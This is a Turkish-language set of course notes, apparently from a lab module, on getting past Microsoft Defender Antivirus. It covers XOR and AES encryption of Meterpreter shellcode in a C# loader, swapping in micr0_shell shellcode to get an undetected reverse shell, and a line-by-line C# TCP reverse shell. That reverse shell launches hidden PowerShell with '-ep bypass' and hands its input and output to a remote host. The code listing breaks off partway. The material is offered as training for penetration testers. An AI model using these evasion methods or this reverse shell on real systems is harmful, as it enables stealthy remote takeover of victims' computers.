---
{"dg-publish":true,"permalink":"/active-directory-expert/windows-evasion-techniques/"}
---


### Introduction to the Lab

Bu modül boyunca aşağıdaki iki Windows VM'si ile çalışacağız:

==EVASION-DEV== : Payload'ları geliştirmek/ayıklamak için admin ayrıcalıklarına sahip bir Windows sunucusu.

==EVASION-TARGET== : Düşük ayrıcalıklı kullanıcı erişimine sahip bir Windows sunucusu. Bölüm soruları ve beceri değerlendirmeleri bu makineye saldırmayı gerektirecektir.

Makinalara erişmenin bir yolu, aşağıdaki söz dizimini kullanarak **xfreerdp** ile bağlantı kurmaktır. Dosyaların iki yönlü olarak aktarılması gerektiğinden, **/drive** parametresi local bir sürücüyü remote makineye bağlamamıza olanak tanır (ancak, bu klasördeki dosyaların Microsoft Defender Antivirus tarafından periyodik olarak taranıp silinebileceğini unutmayın).


`xfreerdp /v:[IP] /u:[USERNAME] /p:'[PASSWORD]' /dynamic-resolution /drive:linux,/tmp`



### EVASION-DEV

Bu bölümün sorusu EVASION-DEV'e erişim sağlar. Bölüm sorularından herhangi birini çözmek için bir exploit geliştirirken bunu kullanın.

Geliştirme sanal makinesi için kimlik bilgileri aşağıdaki gibidir:

![Pasted image 20250101041851.png](/img/user/resimler/Pasted%20image%2020250101041851.png)

Bölümlerde referans verilen araçların çoğu ' C:\Tools ' klasöründe bulunur ve modül boyunca, geliştirilen tüm özel programlar bu dizinin kullanıldığını varsayacaktır.

![Pasted image 20250101041937.png](/img/user/resimler/Pasted%20image%2020250101041937.png)

Not: Ne yaptığınızı bilmiyorsanız, lütfen kendi makinenizi kullanmak yerine geliştirme için sağlanan VM'yi kullanmaya devam edin.


### EVASION-TARGET

Başlangıçta, hedef sanal makineye yalnızca aşağıdaki kullanıcı olarak erişimimiz vardır:

![Pasted image 20250101042215.png](/img/user/resimler/Pasted%20image%2020250101042215.png)

Beceri değerlendirmeleri de dahil olmak üzere tüm etkileşimli bölümler için dosyaların “C:\Alpha” klasörüne yerleştirilmesi veya bu klasördeki dosyalarla etkileşime girilmesi gerekmektedir. Her alt klasör kendi log.txt dosyasını oluşturacak ve bu da bir payload'un çalışmaması durumunda faydalı olacaktır

![Pasted image 20250101042254.png](/img/user/resimler/Pasted%20image%2020250101042254.png)


### Microsoft Defender Antivirus

Microsoft Defender Antivirus, Windows 8'den bu yana her Windows kopyasına önceden yüklenmiş olarak gelen bir antivirüs yazılımı bileşenidir.

![Pasted image 20250101042406.png](/img/user/resimler/Pasted%20image%2020250101042406.png)

En yaygın kullanılan (masaüstü) işletim sisteminde yerleşik olarak bulunduğu göz önüne alındığında, Microsoft Defender Antivirus'ün en yaygın kullanılan antivirüs çözümlerinden biri olması şaşırtıcı değildir


### Perde Arkası

Microsoft Defender Antivirus, sahne arkasında kötü amaçlı yazılımları tanımlamak için bir dizi teknik kullanır. Bu teknikler arasında daha geleneksel **"signature scans"** (imza taramaları) ile daha modern **"machine learning models"** (makine öğrenimi modelleri) bulunur (şema [Microsoft](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/adv-tech-of-mdav?view=o365-worldwide)'tan alınmıştır). Sonr ekle

![Pasted image 20250101042847.png](/img/user/resimler/Pasted%20image%2020250101042847.png)


Bu modülün amaçları doğrultusunda, kullanılan tüm teknikleri iki ana tespit mekanizması kategorisinde basitleştirebiliriz:

* Statik Analiz: kötü amaçlı yazılımları çalıştırılmadan önce disk üzerinde tespit etmekle ilgilidir.

* Dinamik Analiz : Process belleğindeki aktif kötü amaçlı yazılımları tespit etmekle ilgilidir.

Microsoft Defender Antivirus, çeşitli nedenlerle dosya veya **process** taraması yapabilir. Örneğin, şu durumlarda tarama gerçekleştirir:

* Dosya oluşturma/değiştirme : böylece kötü amaçlı bir dosya çalıştırılmadan önce yakalanabilir
* Şüpheli davranış: Örneğin, bir Microsoft Word **instance**'ının bir PowerShell **instance**'ı başlatması genellikle kötü amaçlı bir davranıştır.

Bu modül boyunca, hem statik hem de dinamik algılama mekanizmalarını nasıl atlatacağımızı öğreneceğiz ve özellikle Microsoft Defender Antivirüs'e odaklanacak olsak da, öğretilen teknikler diğer antivirüs yazılımı çözümlerinin çoğunda çalışacak şekilde uyarlanabilir


### Microsoft Defender Antivirüs ile Etkileşim

Microsoft Defender Antivirus, Windows Güvenlik client arayüzü,[ PowerShell için Defender Modülü](https://learn.microsoft.com/en-us/powershell/module/defender/?view=windowsserver2025-ps) ve [birkaç farklı yöntem](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configuration-management-reference-microsoft-defender-antivirus?view=o365-worldwide) aracılığıyla yönetilebilir.


### Windows Security Client Interface

Microsoft Defender Antivirus'ü yönetmenin en yaygın yolu, Windows'ta built-in olarak bulunan Windows Security uygulamasının Virus & Threat protection sekmesidir.

![Pasted image 20250101051159.png](/img/user/resimler/Pasted%20image%2020250101051159.png)

Grafik user interface, taramaları başlatmamıza, koruma geçmişini görüntülememize, koruma ayarlarını değiştirmemize ve klasör istisnalarını yapılandırmamıza olanak tanır.


### Defender Module for PowerShell

[PowerShell için Defender Modülü](https://learn.microsoft.com/en-us/powershell/module/defender/), kullanıcıların GUI arayüzünün sunduklarının tümünü ve daha fazlasını yapmasına olanak tanır.


![Pasted image 20250101051511.png](/img/user/resimler/Pasted%20image%2020250101051511.png)
![Pasted image 20250101051519.png](/img/user/resimler/Pasted%20image%2020250101051519.png)

Bilgisayardaki antimalware yazılımı (Microsoft Defender Antivirus dahil) hakkında durum ayrıntılarını almak için kullanılabilen [GetMpComputerStatus](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus) ile başlayarak daha kullanışlı komutlardan bazılarını gözden geçirelim. Örneğin, aşağıdaki çıktıya dayanarak şunu söyleyebiliriz:

---
**Get-MpComputerStatus**, bilgisayarda yüklü olan Microsoft Defender Antimalware yazılımının durumunu öğrenmek için kullanılan bir PowerShell cmdlet'idir. Bu komut, yazılımın güncel durumu ve ayarları hakkında ayrıntılı bilgiler sağlar.

### **Ne Yapar?**

Bu komut çalıştırıldığında, aşağıdaki gibi bilgileri alabilirsiniz:

- Antimalware motoru ve yazılım sürümü.
- Gerçek zamanlı koruma (Real-Time Protection) etkinliği.
- Virüs ve casus yazılım imza sürümleri ve son güncellenme tarihleri.
- Hızlı tarama ve tam tarama bilgileri (yaş, başlangıç ve bitiş zamanları).
- **Behavior Monitor**, **Ioav Protection** gibi özelliklerin açık veya kapalı olduğu.
- Bilgisayarın genel güvenlik durumu.


---


* İmzalar en son 08.04.2024 tarihinde güncellenmiştir
* Kurcalamaya karşı koruma devre dışı
* Bilgisayar sanal bir makinedir
* Real-time protection is enabled

![Pasted image 20250101051816.png](/img/user/resimler/Pasted%20image%2020250101051816.png)


[Get-MpThreat](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreat) bilgisayarda tespit edilen tehditlerin geçmişini görüntülemek için kullanılabilir. Örneğin, aşağıda bir Cobalt Strike Beacon tespit edildiğini varsayabiliriz.


![Pasted image 20250101052239.png](/img/user/resimler/Pasted%20image%2020250101052239.png)
![Pasted image 20250101052243.png](/img/user/resimler/Pasted%20image%2020250101052243.png)


[Get-MpThreatDetection](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreatdetection), kullanıcıların bir bilgisayardaki tehdit algılama geçmişini görüntülemelerine olanak tanıyan benzer bir komuttur. Tespit edilen Cobalt Strike Beacon ile ilgili tespit olaylarını almak isteseydik, ThreatID'yi ek bir parametre olarak belirtebilirdik. Bu çıktıya dayanarak, C:\artifact_x64.exe dosyasının 4/9/2024 9:38:39 AM tarihinde tespit edildiğini görebiliriz.

![Pasted image 20250101052450.png](/img/user/resimler/Pasted%20image%2020250101052450.png)

Bahsedeceğimiz son iki yararlı komut, Defender'ı yapılandırmak için kullanılabilecek [Get-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/get-mppreference) ve [SetMpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference) komutlarıdır. Microsoft Defender Antivirus ile oynarken, dosyaların silinmesini önlemek için çoğu zaman gerçek zamanlı korumayı etkinleştirmek / devre dışı bırakmak gerekir. Bu, aşağıdaki komutla hızlı bir şekilde yapılabilir:

![Pasted image 20250101052534.png](/img/user/resimler/Pasted%20image%2020250101052534.png)



### Static Analysis

### How Does It Work?

Microsoft Defender Antivirus çerçevesinde statik analiz, imza taramaları yoluyla diskteki kötü amaçlı yazılımların tespit edilmesi anlamına gelir. Bu yöntem, dosya hash'lerini, bayt desenlerini ve dizeleri bilinen kötü amaçlı değerlerden oluşan bir veritabanına karşı kontrol etmeyi içerir.

Örneğin, bir bilgisayarda SHA256 hash ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e4 1aa olan bir dosya varsa, aşağıdaki VirusTotal ekran görüntüsünde gösterildiği gibi statik analiz bunu WannaCry'ın bir kopyası olarak işaretleyecektir:

![Pasted image 20250101053043.png](/img/user/resimler/Pasted%20image%2020250101053043.png)

Dosya hash'lerinin yanı sıra, bir dosyanın içinde görünen bayt modelleri ( stringler dahil ) kötü amaçlı yazılımları tespit etmek için bir başka güvenilir tekniktir. Örneğin, aşağıdaki [YARA kuralı](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_wannacry.yar), farklı dosya hash'lerine sahip olsalar bile WannaCry örneklerini tanımlamak için 15 farklı dize ve 6 bayt dizisi kullanır

![Pasted image 20250101053342.png](/img/user/resimler/Pasted%20image%2020250101053342.png)

Microsoft Defender Antivirus tarafından kullanılan imza veritabanı herkese açık değildir; ancak [Matt Graeber](https://github.com/mattifestation) tarafından geliştirilen ve Windows Defender Antivirus imzalarını açabilen bir reverse engineering script olan [ExpandDefenderSig.ps1](https://gist.github.com/mattifestation/3af5a472e11b7e135273e71cb5fed866) ile bu veritabanını dolaylı olarak keşfedebiliriz

Script'i kullanarak, örneğin “WNcry@2ol7” (yukarıdaki YARA kuralındaki stringlerden biri) ifadesinin Microsoft'un imza veritabanında göründüğünü görebiliriz :

![Pasted image 20250101053937.png](/img/user/resimler/Pasted%20image%2020250101053937.png)
![Pasted image 20250101053950.png](/img/user/resimler/Pasted%20image%2020250101053950.png)


**ExpandDefenderSig.ps1** adlı bir PowerShell modülünü içe aktarıyor. Bu modül, Defender Signature Database dosyalarını açıp analiz etmek için özel olarak yazılmış bir araç içeriyor.

`ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates{50326593-AC5A-4EB5-A3F0-047A75D1470C}\mpavbase.vdm"`

`ls` (veya `Get-ChildItem`) komutu, belirtilen dizindeki **mpavbase.vdm** adlı dosyayı listeliyor. Bu dosya, Defender'ın kullandığı **signature database**'lerinden biridir ve zararlı yazılım tespitine yönelik imzalar içerir.


`| Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw`

Bu komut, önceki `ls` çıktısını bir pipe (`|`) ile **Expand-DefenderAVSignatureDB** adlı komuta geçiriyor. Bu komut:

- **mpavbase.vdm** dosyasını alır.
- Defender'ın signature database'ini **mpavbase.raw** adlı bir dosyaya çıkarır. Bu dosya ham verileri içerir ve daha fazla analiz yapılabilir.

- **`strings64.exe`**:
    
    - Bu araç, bir dosyadaki **okunabilir ASCII veya Unicode karakter dizilerini** (strings) çıkarmak için kullanılır.
    - Özellikle **binary** dosyalarda metin veya anlamlı veri aramak için yaygın bir araçtır.
- **`.\mpavbase.raw`**:
    
    - Bir önceki komutla oluşturulmuş ham imza verilerinin bulunduğu dosyadır. Bu dosya Microsoft Defender’ın zararlı yazılım tespit verilerini içerir.
- **`| Select-String -Pattern "WNcry@2ol7"`**:
    
    - Çıkarılan diziler arasında, **"WNcry@2ol7"** ifadesini arar.
    - **Select-String**, bir dosya veya komuttan gelen çıktıyı belirli bir desenle (pattern) filtrelemek için kullanılır.


### Örnek Olay İncelemesi: NotMalware

#### Başlangıç Noktası

Statik analiz hakkında temel bir anlayışa sahip olduktan sonra, kötü amaçlı bir programı Microsoft Defender Antivirus'ün diskte depolandığında algılamayacağı şekilde nasıl değiştireceğimizi öğreneceğiz. Bu durumda, [meterpreter/reverse_http](https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/) shellcode'unu çalıştırmak için yaygın WinAPI işlevlerini kullanan C# ile yazılmış aşağıdaki shellcode yükleyicisini kullanacağız (bu programın tam olarak nasıl çalıştığını anlamak konusunda endişelenmeyin).


![Pasted image 20250101141951.png](/img/user/resimler/Pasted%20image%2020250101141951.png)![Pasted image 20250101142015.png](/img/user/resimler/Pasted%20image%2020250101142015.png)![Pasted image 20250101142024.png](/img/user/resimler/Pasted%20image%2020250101142024.png)

Not: Yeni bir proje oluştururken Console App (.NET Framework) seçtiğinizden emin olun ve derlerken Release modunda x64'ü seçtiğinizden emin olun.

Gerçek zamanlı koruma devre dışıyken bu programı derleyip çalıştırdığımızda, amaçlandığı gibi çalıştığını ve bir meterpreter oturumuyla sonuçlandığını görebiliriz.

![Pasted image 20250101142120.png](/img/user/resimler/Pasted%20image%2020250101142120.png)

Not: C:\Tools klasöründe bir antivirüs engellemesi vardır, böylece Microsoft Defender Antivirüs'ün onları silmesinden endişe etmeden araçları kullanabilir/geliştirebiliriz.

Ancak, Real-time korumayı etkinleştirdikten sonra, derlenen programı C:\Tools'tan Masaüstüne kopyalamaya çalışmak, dosyanın Microsoft Defender Antivirus tarafından algılanmasına neden olacaktır.

![Pasted image 20250101142217.png](/img/user/resimler/Pasted%20image%2020250101142217.png)

Get-MpThreat ve Get-MpThreatDetection komutlarını kullanarak, NotMalware.exe dosyasının çalıştırılmadan önce Trojan:Win64/Meterpreter.E olarak sınıflandırıldığını görebiliriz.

![Pasted image 20250101142244.png](/img/user/resimler/Pasted%20image%2020250101142244.png)

Not: Koruma geçmişi günlüğünü temizlemek için aşağıdaki klasördeki tüm dosyaları silmeniz yeterlidir: C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service


### XOR Encryption

Get-MpThreat ve Get-MpThreatDetection tarafından sağlanan bilgiler değerli olsa da, dosyada tam olarak neyin bu algılamayı tetiklediğini bilmiyoruz. Bunu manuel olarak anlamanın sıkıcı yolları vardır veya bunu basitçe anlamak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) gibi bir araç kullanabiliriz. Öncelikle, Real-time korumanın devre dışı bırakıldığından emin olun, NotMalware.exe dosyasını içeren klasöre gidin ve ardından aşağıdaki komutu çalıştırın:

![Pasted image 20250101151222.png](/img/user/resimler/Pasted%20image%2020250101151222.png)

ThreatCheck, bir dosyayı parçalara bölerek ve ardından Microsoft Defender Antivirus'ün bir algılamayı tetikleyen bir şey bulana kadar bunları taramasını sağlayarak çalışır. Çıktıya baktığımızda, Microsoft Defender Antivirus'ün Meterpreter shellcode baytlarını tespit ettiği açıkça görülüyor.

![Pasted image 20250101151258.png](/img/user/resimler/Pasted%20image%2020250101151258.png)

Metasploit Framework iyi bilinen bir açık kaynak aracı olduğundan, Microsoft'un Microsoft Defender Antivirus için ürettiği shellcode'u yakalamak için imzalar geliştirmesi şaşırtıcı olmamalıdır. Bu da imza taramalarını atlatmak için bir şekilde gizlememiz ve böylece tanınmamasını sağlamamız gerektiği anlamına geliyor.

Geleneksel olarak, bunu yapmanın çok yaygın bir yolu, programda depolanan shellcode'u XOR'lamak ve ardından belleğe yazmadan hemen önce orijinal değerlerin geri yüklenmesi için tekrar XOR'lamaktı. Böylece, dosya Microsoft Defender Antivirus tarafından tarandığında, shellcode bir imza ile eşleşmemesi gereken rastgele baytlar olarak görünecektir.

Bu [CyberChef tarifiyle](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')XOR(%7B'option':'Hex','string':'5c'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)) shellcode'u 0x5C değeriyle XOR işlemine tabi tutabiliriz (tarifin çalışmasını engellememek için satır sonlarından kurtulduğunuzdan emin olun).

![Pasted image 20250101151604.png](/img/user/resimler/Pasted%20image%2020250101151604.png)

- **Orijinal shellcode'u almış**, hexadecimal formatında işlenebilir hale getirmiş.
- **XOR** işlemiyle her byte'ı `0x5C` anahtarıyla şifrelemiş, böylece shellcode'un içeriğini gizlemiş.
- Çıkışta yeni bir şifrelenmiş shellcode üretmiş.

Programdaki shellcode'u çıktı ile değiştirebilir ve ardından shellcode'u belleğe yazmadan hemen önce her baytı 0x5C ile XOR'layan kısa bir döngü ekleyebiliriz.


![Pasted image 20250101151757.png](/img/user/resimler/Pasted%20image%2020250101151757.png)

Basit XOR şifrelemesi geçmişte antivirüs imza taramalarını atlatmak için yeterli olsa da, programı derleyip ThreatCheck'i bir kez daha çalıştırdığımızda, Microsoft Defender Antivirus'ün shellcode'u hala algıladığını görüyoruz:

![Pasted image 20250101152130.png](/img/user/resimler/Pasted%20image%2020250101152130.png)


### AES Encryption

Antivirüs çözümlerini atlatmanın ilgi çekici bir yönü, belirli bir hedefe ulaşmak için kesin bir yöntemin olmaması nedeniyle yaratıcılık gerektirmesidir - “doğru” veya “yanlış” yöntem yoktur. Bu durumda, shellcode'u XOR ile şifrelemek Microsoft Defender Antivirüs'ü atlatmak için yeterli değildir, bu nedenle bunun yerine shellcode'u AES ile şifrelemek gibi farklı bir şey deneyelim. Shellcode'u AES ile şifrelemek için başka bir CyberChef tarifi kullanabiliriz (rastgele bir anahtar ve IV kullanarak).

![Pasted image 20250101152240.png](/img/user/resimler/Pasted%20image%2020250101152240.png)

Çıktıyı kopyaladıktan sonra, C# programı basit bir döngüden biraz daha fazla değişiklik gerektirecektir, ancak değişiklikler oldukça basittir:

![Pasted image 20250101152318.png](/img/user/resimler/Pasted%20image%2020250101152318.png)
![Pasted image 20250101152328.png](/img/user/resimler/Pasted%20image%2020250101152328.png)


Bu kez, ThreatCheck'i derlenen kötü amaçlı yazılıma karşı çalıştırmak “Tehdit bulunamadı!” mesajıyla sonuçlanır

![Pasted image 20250101152405.png](/img/user/resimler/Pasted%20image%2020250101152405.png)

Real-time korumayı yeniden etkinleştirerek, dosyayı Masaüstüne kopyalayarak ve hemen kaldırılmadığını fark ederek Microsoft Defender Antivirus'ün programı kötü amaçlı olarak algılamadığını doğrulayabiliriz. Hatta bir adım daha ileri gidebilir ve bir meterpreter oturumu oluşturarak çalıştırmayı deneyebiliriz:

![Pasted image 20250101152439.png](/img/user/resimler/Pasted%20image%2020250101152439.png)


### Sonraki Adımlar

Meterpreter reverse shell içinde bir shell açmaya çalışırsak, işlemimiz algılanacak ve sonuç olarak öldürülecektir:

![Pasted image 20250101152517.png](/img/user/resimler/Pasted%20image%2020250101152517.png)

Bu nedenle, her ne kadar muharebeyi kazanmış olsak da savaşı kaybetmiş durumdayız. Bu tür davranışsal tespitlerden kaçınmak bir sonraki bölümde öğreneceğimiz şeydir.


### Dynamic Analysis

#### How Does It Work?

Saldırganlar statik analizi kolayca atlayabildiğinden, Microsoft Defender Antivirus dinamik analizi de kullanır. Yeni bir prosesin oluşturulması veya şüpheli davranışların tespit edilmesi gibi belirli olaylar bir prosesin bellek taramalarını tetikleyebilir.

Önceki bölümün sonunda, NotMalware.exe çalıştırıldığında Microsoft Defender Antivirus tarafından çok hızlı bir şekilde yakalandığını gördük. [Mp-GetThreatDetection'ı](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreatdetection) kullanarak NotMalware.exe'nin davranışa dayalı olarak, özellikle de başka bir proses başlatmaya çalıştığında tespit edildiğini görebiliriz.

![Pasted image 20250101154936.png](/img/user/resimler/Pasted%20image%2020250101154936.png)

Esasen, Microsoft Defender Antivirüs NotMalware.exe prosesinin şüpheli bir işlem gerçekleştirdiğini fark ederek ona karşı bir bellek taramasını tetikledi. Meterpreter shellcode'u bu noktada bellekte şifrelenmemiş olarak bulunduğundan, Microsoft Defender Antivirus prosesi tespit etti ve öldürdü.

Peki bu konuda ne yapabiliriz? Peki, aşağıdaki üç seçeneğe bir göz atalım...


### Seçenek 1: Payload'un Değiştirilmesi

Daha önce de belirtildiği gibi, Meterpreter Microsoft tarafından iyi bilinmektedir, bu nedenle [MSRC](https://msrc.microsoft.com/) ekibi şifrelenmemiş shellcode için çeşitli imzalar geliştirmiştir. Bununla birlikte, davranışsal analizden kaçınabileceğimiz yöntemlerden biri, Meterpreter payload'unu bir bellek taramasını tetiklemekten kaçınacak veya taranırsa herhangi bir imzayla eşleşmeyecek şekilde değiştirmektir . Bu yöntemlerden biri Meterpreter payload'unun kaynak kodunun değiştirilmesini gerektirir ki bu da bu modülün kapsamı dışındadır.

Not: Meterpreter shellcode'unun ne yaptığını ve nasıl gizlenebileceğini daha derinlemesine anlamak isteyen öğrenciler için Assembly Diline Giriş, üzerinde çalışmak için ilginç bir modül olabilir


### Seçenek 2: Payload'u Değiştirme

Meterpreter kullanmak zorunlu olmadıkça, davranışsal analizden kaçmak için diğer yöntem, payload'u daha az bilinen bir payload ile değiştirmektir. Yalnızca bir reverse shell oluşturmak istediğimizden, Meterpreter stager shellcode'unu minimal bir reverse shell payload ile değiştirebiliriz.

Örnek olarak [micr0_shell](https://github.com/senzee1984/micr0_shell)'i kullanalım. Proje açıklamasından bu programın “Windows x64 için reverse shell shellcode” ürettiğini görebiliriz.

![Pasted image 20250101155943.png](/img/user/resimler/Pasted%20image%2020250101155943.png)

Aşağıdaki komut ile IP ve portumuz ile shellcode oluşturabiliriz:

![Pasted image 20250101160025.png](/img/user/resimler/Pasted%20image%2020250101160025.png)
![Pasted image 20250101160042.png](/img/user/resimler/Pasted%20image%2020250101160042.png)
![Pasted image 20250101160048.png](/img/user/resimler/Pasted%20image%2020250101160048.png)

Daha sonra, Meterpreter shellcode yerine kullanacağımız yeni şifreli payload'u elde etmek için shellcode çıktısını daha önceki [AES-şifreleme CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')) tarifine kopyalayıp yapıştıracağız.

![Pasted image 20250101160452.png](/img/user/resimler/Pasted%20image%2020250101160452.png)

NotMalware içinde base64 stringini bu yeni string ile değiştirebilir ve programı yeniden derleyebiliriz.

![Pasted image 20250101160557.png](/img/user/resimler/Pasted%20image%2020250101160557.png)

Şimdi, Masaüstünden NotMalware.exe'yi Real-time protection etkin olarak çalıştırdığımızda, bir reverse shell elde ettiğimizi ve Microsoft Defender Antivirus tarafından algılanmadan onunla etkileşime girebildiğimizi fark ediyoruz

![Pasted image 20250101160929.png](/img/user/resimler/Pasted%20image%2020250101160929.png)



### Seçenek 3: Özel Araçlar Yazma

Açık kaynaklı araçlar (Metasploit ve Mimikatz gibi) saldırı güvenliği operasyonlarında (ve siber suçlarda) yaygın olarak kullanıldığı için, **antivirüs çözümleri** bu araçlar için çeşitli imzalar bulundurur. Ancak, yeni ve olgunlaşmamış araçlar için imzaların geliştirilmesi genellikle zaman alır. Bu bölümde, Meterpreter payload'u yerine **micr0_shell** payload'unu kullanarak algılamadan başarıyla kaçındık. Bu yaklaşım etkili oldu, çünkü büyük olasılıkla Microsoft Defender Antivirus, şu anda bu spesifik shellcode için bir imza içermiyor. Sonuç olarak, bir bellek taraması başlatılsa bile, şüpheli olayların algılanması muhtemel değildir. Ancak, **micr0_shell** kullanımı saldırganlar arasında daha yaygın hale gelirse, gelecekte bir imzanın eklenmesi olasıdır.

Bu da bizi en etkili ama aynı zamanda en çok zaman alan üçüncü ve son seçeneğimize getiriyor: özel araçlar yazmak. Özel araçlar kullanıldığında, bilinen herhangi bir kötü amaçlı imzayla eşleşmeyecekleri için ne statik ne de davranışsal analiz bir sorun teşkil eder .

Örnek olarak, bir antivirüs çözümü imza veritabanında bulunan bilinen herhangi bir malicious bileşeni kullanmadığı için herhangi bir gizleme veya şifreleme gerektirmeyen basit bir TCP reverse shell programı yazalım. Visual Studio 2022'yi açın ve RShell adında yeni bir Console App (.NET Framework) projesi oluşturun.

![Pasted image 20250101161722.png](/img/user/resimler/Pasted%20image%2020250101161722.png)

C#'ta bir reverse shell geliştirmek için aşağıdaki class'ları kullanmamız gerekecektir:

* TCP bağlantısını işlemek(handle) için [System.Net.Sockets.TcpClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-8.0)
* [**System.Diagnostics.Process**](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=net-8.0), **cmd.exe** veya **powershell.exe** process'ini başlatmak için kullanılır.
* TCP akışını read/write için [System.IO.StreamReader](https://learn.microsoft.com/en-us/dotnet/api/system.io.streamreader?view=net-8.0), [System.IO.StreamWriter](https://learn.microsoft.com/en-us/dotnet/api/system.io.streamwriter?view=net-8.0)


Basit bir C# reverse shell örneği aşağıda verilmiştir. Komut satırında belirtilen bir IP adresi ve porta bağlantı kurar, bir powershell.exe process'i ortaya çıkarır ve STDOUT , STDIN ve STDERR için iletişimi process'e yönlendirir.

1. **STDOUT, STDIN ve STDERR için iletişimi process'e yönlendirir":**
    
    - **STDOUT (Standart Çıkış):** Çalıştırılan komutların çıktısını saldırgana iletir.
    - **STDIN (Standart Giriş):** Saldırganın gönderdiği komutları process içinde çalıştırır.
    - **STDERR (Standart Hata Çıkışı):** Eğer bir hata olursa, hata mesajlarını saldırgana iletir.

Kısacası bu kod, hedef sistemi saldırganın kontrolüne açar. Saldırgan, bu bağlantı üzerinden hedefte komut çalıştırabilir, çıktı alabilir ve sistemi yönetebilir.

![Pasted image 20250101181230.png](/img/user/resimler/Pasted%20image%2020250101181230.png)
![Pasted image 20250101181243.png](/img/user/resimler/Pasted%20image%2020250101181243.png)
![Pasted image 20250101181253.png](/img/user/resimler/Pasted%20image%2020250101181253.png)
![Pasted image 20250101181307.png](/img/user/resimler/Pasted%20image%2020250101181307.png)
![Pasted image 20250101181316.png](/img/user/resimler/Pasted%20image%2020250101181316.png)


1. Gerekli Kütüphanelerin Eklenmesi

```
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
```

- **`System`**: Genel fonksiyonlar için kullanılan kütüphane (örneğin hata yönetimi).
- **`System.IO`**: Dosya ve veri akışı (Stream) işlemleri için kullanılır.
- **`System.Net.Sockets`**: TCP/IP bağlantıları kurmak için kullanılır.
- **`System.Diagnostics`**: İşlem (**process**) oluşturmak ve yönetmek için kullanılır


2. Kodun Ana Sınıfı ve İçindekiler

```
namespace RShell

{
	internal class Program

	{
```

- **`namespace RShell`**: Bu kod, "RShell" adında bir isim alanı altında tanımlanmış. Kodun kapsamını organize eder.
- **`internal class Program`**: Program, "Program" adında bir sınıf içeriyor. **`internal`**, sınıfın yalnızca bu proje içinde erişilebilir olduğunu belirtir.


3. `streamWriter` Değişkeni


```
private static StreamWriter streamWriter;
```

**`streamWriter`**: Bir TCP bağlantısı üzerinden gelen verileri göndermek için kullanılır. Bu değişken, tüm kod içinde kullanılabilmesi için global olarak tanımlanmıştır.


4. Main Fonksiyonu

```
static void Main(string[] args)

{
```

- **`Main`**: C#'ta bir programın çalışmaya başladığı ana fonksiyondur.
- **`string[] args`**: Komut satırında girilen IP adresi ve port numarasını alır.


5. Giriş Kontrolü

```
if (args.Length != 2)

{
	Console.WriteLine("Usage: RShell.exe <IP> <Port>");
	return;
}
```

- **Amaç**: Kullanıcı IP adresi ve portu girmediyse, doğru kullanım şeklini ekrana yazdırır ve programı sonlandırır.
- **Örnek Kullanım**: `RShell.exe 192.168.1.10 4444`


6. TCP Bağlantısı Kurulması

```
TcpClient client = new TcpClient();
client.Connect(args[0], int.Parse(args[1]));
```


- **`TcpClient`**: Hedef sistemle TCP protokolü üzerinden bir bağlantı kurmak için kullanılır.
- **`args[0]`**: İlk argüman, bağlantı yapılacak IP adresidir.
- **`int.Parse(args[1])`**: İkinci argüman (port), bir sayı (integer) olarak yorumlanır.


7. Veri Akışı Hazırlığı

```
Stream stream = client.GetStream();
StreamReader streamReader = new StreamReader(stream);
streamWriter = new StreamWriter(stream);
```

- **`GetStream`**: TCP bağlantısında veri akışını alır.
- **`StreamReader`**: Hedeften gelen verileri okumak için kullanılır.
- **`StreamWriter`**: Hedefe veri göndermek için kullanılır.


8. PowerShell Process'inin Oluşturulması

```
Process p = new Process();

p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

p.StartInfo.Arguments = "-ep bypass -nologo";
```

- **`Process`**: Hedef sistemde bir yeni **process** başlatmak için kullanılır.
- **`FileName`**: Çalıştırılacak dosyanın yolu. Burada **PowerShell** başlatılıyor.
- **`Arguments`**: PowerShell’e eklenmiş özel parametreler:
    - **`-ep bypass`**: Script çalıştırma politikalarını atlar (güvenlik önlemini baypas eder).
    - **`-nologo`**: PowerShell’in logosunu ve açılış mesajını gizler.




9. Process Ayarları

```
p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

p.StartInfo.UseShellExecute = false;

p.StartInfo.RedirectStandardOutput = true;

p.StartInfo.RedirectStandardError = true;

p.StartInfo.RedirectStandardInput = true;
```

- **`WindowStyle.Hidden`**: PowerShell penceresi gizli olarak çalıştırılır.
- **`UseShellExecute = false`**: Komut shell'i kullanılmaz, doğrudan komut dosyası çalıştırılır.
- **`RedirectStandardOutput`**, **`RedirectStandardError`**, **`RedirectStandardInput`**:
    - PowerShell’in çıktısı, hataları ve girdisi TCP bağlantısına yönlendirilir.


10. Process'in Çalıştırılması

```
p.Start();

p.BeginOutputReadLine();

p.BeginErrorReadLine();
```

- **`p.Start()`**: PowerShell process'inin başlatır.
- **`BeginOutputReadLine()`**, **`BeginErrorReadLine()`**: PowerShell’in çıktısını ve hatalarını okumaya başlar.



11. Kullanıcı Girdisinin İşlenmesi

```
string userInput = "";
